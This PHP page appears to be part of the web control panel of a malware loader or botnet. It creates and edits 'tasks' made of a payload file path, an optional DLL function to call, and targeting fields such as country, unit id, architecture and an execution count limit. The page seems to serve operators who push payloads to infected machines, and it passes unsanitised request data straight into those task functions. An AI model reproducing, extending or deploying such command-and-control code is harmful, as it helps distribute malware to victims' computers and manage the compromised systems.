<?php

   session_start();

   error_reporting( 0 );

   if ( !( isset( $_SESSION['Name'] ) ) )
   {
      header( "Location: Login.php" );
      exit;
   }

   include( "Header.php" );
   include( "Functions.php" );

   echo "<table cellpadding=0 cellspacing=0 width=\"100%\" style =\"border: 1px solid;\">
         <tr style=background-color:#11101d; height=\"50\">
            <td>
               <div align = center>
                     <font color=\"#E4E9F7\">" . $_SESSION['Name'] . $lang["_009"] . "</font>
               </div>
            </td>
         </tr>
      </table>";

   sTable();

   if( isset( $_POST['submit'] ) ) 
   { 
      if ( $_POST['filetype'] == 1 )
      {
         MakeTaskAlt( $_POST['path']  . ":::" . $_POST['dllfunction'], $_POST['tid'], $_POST['comment'], $_POST['arc'], "0", $_POST['filetype'], $_POST['folder'], $_POST['count'], $_POST['unitid'], $_POST['country'], $_POST['id'], $_POST['ctlimit'] ); 
      }
      else
      {
         MakeTaskAlt( $_POST['path'], $_POST['tid'], $_POST['comment'], $_POST['arc'], $_POST['run'], $_POST['filetype'], $_POST['folder'], $_POST['count'], $_POST['unitid'], $_POST['country'], $_POST['id'], $_POST['ctlimit'] ); 
      }

      echo "<meta http-equiv=\"refresh\" content=\"1; url=Show_Tasks.php\">"; 
   }
   else
   {
      if ( $_SESSION['Name'] != "OBSERVER" ) 
      {
         echo ( EditTask( $_GET['id'] ) ); 
      }
      else
      {
         echo $lang["0088"]; 
      }
   }
   
   include( "Footer.php" );
?> 